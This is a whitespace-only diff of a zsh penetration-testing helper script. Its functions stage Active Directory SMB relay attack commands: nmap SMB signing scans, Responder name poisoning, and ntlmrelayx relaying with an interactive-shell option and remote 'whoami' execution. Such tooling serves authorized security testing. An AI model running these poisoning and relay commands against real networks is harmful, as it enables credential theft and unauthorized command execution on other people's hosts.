@@ -30,36 +30,36 @@ nb-ad-smb-relay-install() {
 }
 
 nb-ad-smb-relay-enum() {
-	nb-vars-set-network
+  	nb-vars-set-network
 
-  print -z "grc nmap --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
+    print -z "grc nmap --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
 }
 
 nb-ad-smb-relay-responder() {
     nb-vars-set-iface
 
-  print -z "sudo responder -I ${__IFACE} -dwPv | tee -a $(domadpath)/responder-smb-relay.txt"
+    print -z "sudo responder -I ${__IFACE} -dwPv | tee -a $(domadpath)/responder-smb-relay.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay() {
-	__ask "Enter a targets list file"
-	local targets && __askvar targets TARGETS
+	  __ask "Enter a targets list file"
+	  local targets && __askvar targets TARGETS
 
-  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee -a $(domadpath)/ntlmrelayx.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee -a $(domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
-	__ask "Enter a targets list file"
-	local targets && __askvar targets TARGETS
+	  __ask "Enter a targets list file"
+	  local targets && __askvar targets TARGETS
 
-  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee -a $(domadpath)/ntlmrelayx.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee -a $(domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-whoami() {
-	__ask "Enter a targets list file"
-	local targets && __askvar targets TARGETS
+	  __ask "Enter a targets list file"
+	  local targets && __askvar targets TARGETS
 
-	print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee -a $(domadpath)/ntlmrelayx.txt"
+	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee -a $(domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
